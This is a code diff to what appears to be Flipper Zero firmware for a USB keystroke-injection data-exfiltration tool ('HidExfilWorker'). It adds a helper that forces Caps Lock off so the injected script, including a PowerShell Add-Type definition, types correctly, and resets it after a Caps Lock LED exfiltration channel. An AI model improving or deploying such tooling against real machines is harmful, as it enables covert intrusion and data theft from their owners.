@@ -139,6 +139,18 @@ static uint16_t char_to_hid_key(char c, bool* need_shift) {
     }
 }
 
+/* Ensure Caps Lock is OFF on the target before typing.
+ * If Caps Lock is on, Shift+Key produces the OPPOSITE case on Windows,
+ * causing "[KBLed]" to be typed as "[kblED]" and breaking the script. */
+static void ensure_capslock_off(void) {
+    uint8_t leds = furi_hal_hid_get_led_state();
+    if(leds & HID_KB_LED_CAPS) {
+        furi_hal_hid_kb_press(HID_KEYBOARD_CAPS_LOCK);
+        furi_hal_hid_kb_release(HID_KEYBOARD_CAPS_LOCK);
+        furi_delay_ms(50);
+    }
+}
+
 /* Type a single character via HID */
 static void type_char(char c, uint32_t delay_ms) {
     if(c == '\r') return; /* skip CR */
@@ -189,6 +201,11 @@ static bool phase_inject(HidExfilWorker* worker) {
     }
 
     uint32_t delay = worker->config.injection_speed_ms;
+
+    /* Clear Caps Lock before typing — if CapsLock is on, Shift+Key produces
+     * the opposite case on Windows, turning [KBLed] into [kblED] and breaking
+     * the Add-Type class definition. */
+    ensure_capslock_off();
 
     /* Open terminal based on target OS */
     switch(worker->config.target_os) {
@@ -454,6 +471,10 @@ static void phase_cleanup(HidExfilWorker* worker) {
     }
 
     uint32_t delay = worker->config.injection_speed_ms;
+
+    /* Clear Caps Lock again — the LED encoding protocol may have left it on.
+     * The EOT sequence toggles CapsLock 3 times (odd), which flips the state. */
+    ensure_capslock_off();
 
     switch(worker->config.target_os) {
     case TargetOSWindows:
